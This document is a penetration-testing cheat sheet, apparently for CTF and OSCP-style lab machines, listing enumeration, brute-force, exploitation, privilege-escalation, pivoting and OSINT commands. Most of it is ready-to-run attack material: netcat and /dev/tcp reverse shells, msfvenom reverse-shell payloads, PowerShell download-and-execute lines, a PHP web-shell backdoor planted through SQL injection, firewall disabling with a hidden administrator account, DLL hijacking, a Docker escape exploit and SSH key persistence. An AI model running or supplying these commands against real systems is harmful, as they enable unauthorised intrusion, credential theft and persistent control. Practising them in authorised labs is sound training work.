# Network Enumeration

Quick nmap all TCP ports:
`nmap -p 0-65535 --min-rate=1000 -T4 $IP`

Default nmap all TCP ports:
`nmap -Pn -sCV -p- $IP`

Default nmap against specific ports:
`nmap -T4 -sV -sC -p 22,80 $IP`

Nmap all TCP ports:
`nmap -vv --reason -Pn -A --osscan-guess -sC --version-all -p- $IP`

Nmap UDP top 100:
`nmap -vv --reason -Pn -sU -A --version-all --top-ports 100 $IP`

Massscan UDP all ports:
`sudo masscan -pU:1-65535 $IP --rate=1000 -e tun0`

# Port Enumeration

Nmap Vulnerable Scripts TCP Ports:
`nmap -T4 -sV --script vuln -p 80,443,8080 $IP`

Ffuf Directory Brute Force: (Fastest)
`ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://$IP/FUZZ`

Gobuster Directory Brute Force: (recommend first using common.txt wordlist)
`gobuster dir -t 10 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -u http://$IP/`

`gobuster dir -t 10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -u http://$IP/`

Gobuster VHOST Brute Force:
`gobuster vhost -u http:/$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

Gobuster DNS Brute Force:
`sudo gobuster dns -d domain.ctf -r $IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt`

Hydra POST Brute Force:
`hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 http-post-form://$IP/path/to/login.php:username=^USER^&password=^PASS^:invalid-login-message`

WPScan Quick:
`wpscan --url http:/$IP/ -e u,ap -o wpscan.root`

WPscan Full:
`wpscan --url http://$IP/ --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee wpscan.txt`

WPScan Brute Force (faster version):
`sudo wpscan --url http://$IP/ -U admin --passwords /usr/share/wordlists/rockyou.txt  -t 100 --password-attack wp-login`

Curl with urlencoded payloads:
`curl http://$IP/page.php -G --data-urlencode "value1=<h1>abc</h1>" --data-urlencode "value2=1234"`

curl with POST urlencoded payload:
`curl http://$IP/admin.php -X POST --data-urlencode "value1=|| whoami" --data-urlencode "submit=Submit Query"`

SSH Brute Force (Super slow, since max 4 threads. Use small wordlist):
`hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4 -s 22`

SSH prompts wrong key exchange method:
`ssh -oKexAlgorithms=diffie-hellman-group1-sha1 root@$IP`

DNSrecon Reverse Lookup (Recommended use of a valid domain):
`dnsrecon -r 127.0.0.0/24 -n $IP -d blah`

DNS Zone Transfer any domain:
`dig axfr @$IP`

DNS Zone Transfer specific domain (Recommended, if this does not work use dnsenum to brute force sub-domains):
`dig axfr domain.ctf @$IP`

Get ANY record from DNS server:
`dig ANY @$IP $IP`

Get a copy of all records from DNS server:
`while read p; do dig ANY @$IP domain.ctf| grep -A 4 "ANSWER SECTION\|ADDITIONAL SECTION"; done < domains.txt`

Brute Force DNS subdomains:
`dnsenum --dnsserver $IP -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt domain.ctf`

HTTPS view SSL certificate:
`openssl s_client -connect $IP:443 -showcerts`

HTTPS view SAN in SSL certificate:
`openssl s_client -connect $IP:443 | openssl x509 -noout -text | grep DNS:`

SMBmap with anonymous access, recurseviley list shares and list permissions:
`smbmap -H $IP -u anonymous -r --depth 5`

Nmap smb enum shares (may lis smb's local directory location):
`sudo nmap -script=smb-enum-shares.nse -p445 $IP`

Crackmapexec, will list SMB type, smb signing status, and domain (Helps with Active Directory):
`crackmapexec smb $IP --shares`

Mount an SMB Share:
```
mkdir mount
sudo mount $IP:/sharename mount
```

Brute force valid usernames in Kerberos:
`kerbrute userenum --dc $IP -d domain.ctf /usr/share/seclists/Usernames/top-usernames-shortlist.txt`

Test if Kerberos Pre-auth is disabled for any specific account:
`GetNPUsers.py -dc-ip $IP -no-pass domain.ctf/administrator`

Test if Kerberos Pre-auth is disabled for all accounts (Recommended since it will capture service accounts):
`GetNPUsers.py -dc-ip $IP domain.ctf/ -request`
If Kerberos pre-auth is disabled on any of the above accounts, can use GetNPUsers to send dummy requests for authentication

John to crack hash:
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

ISC BIND - NoIP `/nic/update` to create our own dns record: (needs credentials, default may work)
``curl -X GET 'http://no-ip.htb/nic/update?hostname=new.domain.ctf&myip=<yourip>' --header "Authorization: Basic `echo -n dynadns:sndanyd | base64`"``

Remote and local mysql:
```
mysql -u username -h 10.0.0.1 -p
mysql -u username -pPASSWORD -e "SELECT @@version;"
```

Create your own privatekey (can be used to bypass JWT cookie that requires valid private key):
`openssl genrsa -out privKey.key 2048`

Port 79 - finder service. Protocol allows fingepritning users on remote system, so we can enumerate users:
```
finger @$IP
finger admin@$IP
# Brute force
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
```

## Brute Force

FTP: `hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 10.0.0.1 ftp`

SSH: `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1`

HTTP FORM: `hydra -P "/usr/share/seclists/Passwords/darkweb2017-top10000.txt" "http-post-form://10.0.0.1/login.php:action=login&username=admin&password=^PASS^:Invalid Credentials" -l admin`

# Reverse Shells or Shell access

Reverse Shell Payloads: x

Msfvenom linux elf binary reverse shell:
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=1337 -f elf -o shell.elf`

Msfvenom list all platforms and grep for specific type:
`msfvenom --list | grep powershell`

Msfvenom Windows powershell reverse tcp shell for Buffer Overflow:
`msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=<your ip> LPORT=1337 -f python`

Payload too big? Msfvenom Windows cmd execute dowload a powershell script for Buffer overflow:
`msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://<your-ip>/Invoke-PowershellTcp.ps1')\"" -f python`

Netcat Reverse shell:
`/usr/bin/nc -e /bin/bash <your ip> 1337`

If WinRM port is open, you can use evil-winrm with valid credentials (from LDAP or SMB) to log in:
`evil-winrm -i $IP -u administrator -p 'MyPassword1'`

If SMB shares are open, we can use psexec to login with credentials or NT hash:
`psexec.py domain.ctf/Administrator@$IP -hashes 123456789:123456789`

Base64 a reverse shell:
`echo 'bash -i &>/dev/tcp/<your ip>/443 0>&1' | base64`

URL Encode a base 64 reverse shell: (If sending the request through a url)
``hURL -U "\`echo 'YmFzaCAtaSAmPi9kZXYvdGN123123123123yAwPiYxCg==' | base64 -d | bash\`"``

Drupalarmaggedon 2:
```
wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/drupalgeddon2.rb
sudo ruby drupalgeddon2.rb http://$IP/
```

droopescan to scan moodle:
`droopescan scan moodle -u http://$IP/moodle`

# Priv Esc

For linux look at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

For Windows look at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md   
Also: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

Linux binaries with SUID: https://gtfobins.github.io/

Windows binaries to download execute etc: https://lolbas-project.github.io/

## Linux

Valid users: `cat /etc/passwd | grep 'home\|root'`

OS: `cat /etc/*release*`

Kernel: `uname -mra ` or `cat /proc/version`

Open Ports:`netstat -antup`

Recursive look for sensitive files under /home/ directory: `ls -laR /home`

Interesting binaries with SUID: `find / -perm -u=s -type f 2>/dev/null`

Sensitive readable files: `find / -name id_rsa 2> /dev/null` or `find / \( -name id_rsa -o -name authorized_keys -o -name wp-config.php\) 2> /dev/null`

Find Writable files: ``find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null``

Find folder or file recursively: `find / -name '.git' 2>/dev/null`

Find Cronjobs: `cat /etc/cron*` better yet, download binary x to find hidden cronjobs

If sudo version is version 1.8.27 and user is able to run bash as sudo: `sudo -u#-1 /bin/bash`
Example of vulnerable sudoer:
```
User bob may run the following commands on DANTE-NIX04:
    (ALL, !root) /bin/bash
```

CEWL a website for potential password dictionary attack: `cewl http://10.0.0.1/wordpress/ >> cwl.pass`

WFUZZ for a file: `wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --filter "c=200" http://10.0.0.1/wordpress/FUZZ.config`

## Windows

System Information: `systeminfo`

Enumerate all users in the domain: `net user /domain`

Enumerate specific account in the domain: `net user bob`

Privileges: `whoami /all`

IP Information (Dual homed?): `ip config`

Established connections (Local Addr of 0.0.0.0 means its internal ports): `netstat -ano`

Upload PowerUp and run all checks:
```
# Local
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80

# Remote
IEX(New-Object Net.WebClient).downloadString('http://your-ip/PowerUp.ps1')
Invoke-AllChecks

# Run Command as another user with found creds
$SecPass = ConvertTo-SecureString '<FOUND PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Managemenet.Automation.PSCredential('<FOUND USERNAME>',$SecPass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://your-ip/reverseshell.ps1')" -Credential $cred

# Local: Host reverse shell and have netcat listener
```

Use bloodhound to extract AD data:
```
# Local
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
sudo impacket-smbserver a .
# OR python3 -m http.server 80

## Remote
\\<insert your IP>\SharpHound.exe
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\bob\Downloads\2021123456789_BloodHound.zip")) # Use Full path
# Copy base64 data

# Local
echo -n "<INSERT BASE64 data>" | base64 -d > bloodhound-result.zip

# Local start bloodhound and upload zip (Must have it installed and setup see BloodHound official guidance)
neo4j console
bloodhound
```

WinPeas:
```
# Local
wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe
sudo impacket-smbserver a .
# OR python3 -m http.server 80

# Remote
\\<your ip>\winPEASany.exe
or
wget http://10.10.14.116:9000/winPEASany.exe
winPEASany.exe
```

AlwaysInstalledElevated - RottenTomato   
Follow https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated and verify that AlwaysInstallElevated is set to 1 and created a reverse shell using msfvenom and run the payload and capture the NT Authority System reverse shell:

```
# Windows - Verifying exploit path
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Kali - Window 1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your ip> LPORT=1337 -f msi -o reverse.msi
python3 -m http.server 9000
# or sudo impacket-smbserver a .

# Kali - Window 2
sudo nc -nlvp 1337

# Windows - Run Exploit
curl http://10.10.14.116:9000/reverse.msi -o reverse.msi
# or copy \\<your ip>\reverse.msi c:\full\path\reverse.msi
msiexec /quiet /qn /i reverse.msi
```

Turn off firewall and create a backup account:
```
NetSh Advfirewall set allprofiles state off
net user defender password1$ /add
net localgroup administrators defender /add
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

#Use any tool to log in remotely
wmiexec.py defender@$IP
```

Port forward using plink (Example: Have WinLogOn creds but can't winexe since port 445 is only available internal):
```
# Local setup
apt install ssh
vim /etc/ssh/sshd_config # Allow root to ssh
service ssh restart

# Download 32 or 64 version: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
## Download to remote windows machine
plink.exe -l <your username:root> -pw  <your ssh password:toor> -R 445:127.0.0.1:445 <your ip: 10.10.1.1>
## Linux shell should open
winexe -U Administrator%Password1! //127.0.0.1 "cmd.exe"
```

Transfer files from remote to local via FTP:
```
# Locally
python -m pyftpdlib -p 21 --write
# Remote
ftp <your ip> # anonymous:anonymous
put filename.c
```

DLL Hijacking:
```
# If service found with hijackable DLL. Run commands locally and transfer the malicious dll
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.1 LPORT=4444 -f dll -o msf.dll
# Or make your own: https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/dll-hijacking.md#your-own
# Possible payload: cmd.exe /k net localgroup administrator bob /add
# Move it to the destination folder
sc stop bad-service & sc start bad-service
```

Service Permissions:
```
Placeholder
```

Check permissions of all folders inside PATH:
`for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )`

RDP in linux to Windows Machine:
`xfreerdp /u:admin /p:password /cert:ignore /v:$IP /workarea`
## Docker Priv Esc
CVE-2019-5736. Following https://github.com/Frichetten/CVE-2019-5736-PoC , we can create a sh binary that will overwrite /bin/sh on the docker instance. This will let us elevate to a root shell.

```
# Kali (Window 1)
wget https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go
vim main.go
# Edit the following line:
# var payload = "#/bin/bash \n bash -i >& /dev/tcp/<your ip>/1337 0>&1"
go build main.go
python3 -m http.server 80
# Kali (Window 2)
nc -nvlp 1337

# Remote machine (Window 1)
sudo docker exec -it dockername bash
cd /tmp
wget <your ip>/main
chmod +x main
./main
# Output:
# [+] Overwritten /bin/sh successfully
# [+] Found the PID: 7993
# [+] Successfully got the file handle
# [+] Successfully got write handle &{0xc000392060}

# Notebook machine (Window 2)
sudo docker exec -it dockername /bin/sh
```

## General

SQL injection upload backdoor php file: `"<?php echo
shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`

SQLmap to get tables:
```
sqlmap 'http://127.0.0.1/dict/test.php?id=1' --dbs --batch
sqlmap 'http://127.0.0.1/dict/test.php?id=1' --tables -D phpmyadmin
sqlmap 'http://127.0.0.1/dict/test.php?id=1' --dump -D phpmyadmin -T users
```

Blind SQL Injection Python:
```
wget https://github.com/21y4d/blindSQLi/blob/master/blindSQLi.py
python3 blindSQLi.py
# Time based: T
# Query:
#     List DB Version: SELECT @@version
#     List Databases: SELECT schema_name FROM information_schema.schemata
#     List Tables: SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema='flag'
#     List Columns: SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'
#     Retrive data: SELECT flag FROM flag.flag
# Sleep Time: 1
```

# Pivot

Use SSHUTTLE to route all traffic through a machine:
`sshuttle -r admin@$IP <internal host 1> <internal host 2> <etc>`

Find connected hosts in internal network: `route -nee && arp -e`

Do a port scan with netcat (Good when pivoting): `nc -zv 172.16.0.1 1-65535 2>&1 | grep succeeded`

## Pillage

Crack shadow hash:
`hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt`

Add to your public key to box: `echo '...' >> /root/.ssh/authorized_keys`

# OSINT

Intel Techniques OSINT Tools: https://inteltechniques.com/tools/index.html
OSINT Framework: https://osintframework.com/
Epieos Mail Checker: https://epieos.com/
Username to social media checker: https://whatsmyname.app/
Face Search Engine (guess age): http://www.pictriev.com/
Location per image: Use Google Search by Image: https://images.google.com/
Flight Tracking: https://www.adsbexchange.com/
Twitter search operators: https://developer.twitter.com/en/docs/twitter-api/v1/rules-and-filtering/search-operators
Whois Historic data: https://www.whoxy.com/
